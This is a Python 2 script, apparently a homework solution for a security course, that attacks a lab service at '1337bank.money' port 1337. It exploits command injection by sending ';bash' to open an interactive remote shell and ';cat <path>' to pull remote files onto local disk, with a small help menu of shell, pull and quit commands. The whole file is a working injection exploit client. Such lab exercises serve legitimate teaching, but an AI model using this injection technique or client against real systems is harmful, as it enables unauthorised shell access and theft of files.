"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import sys

host = "1337bank.money" # IP address here
port = 1337 # Port here
help =  """
        shell Drop into an interactive shell
        pull <remote-path> <local-path> Download files
        help Shows this help menu
        quit Quit the shell
        exit Exit
        """

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    
    sinput = cmd.split()
   
    if sinput[0] == 'help':
        print(help)

    elif sinput[0] == 'quit':
        sys.exit()
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    


    if  sinput[0] == 'shell':
        test = s.recv(1024)
        s.send(';bash\n');
        test = s.recv(1024)
        while True:
            shell_input = raw_input('>')
                        
            s.send(shell_input + '\n')
            data = s.recv(1024)
            if not data:
                break

            print(data)

    elif sinput[0] == 'pull':
        data = ''
        test = s.recv(1024)
        s.send(';cat ' + sinput[1] + '\n')
        test = s.recv(1024)
        
        with open(sinput[2], 'w') as the_file:
            while True:
                data = s.recv(1024)

                the_file.write(data)
                if not data:
                  break
                print(data)

    s.close()

if __name__ == '__main__':
    while True:
        user_input = raw_input('hi:  ')
        execute_cmd(user_input)
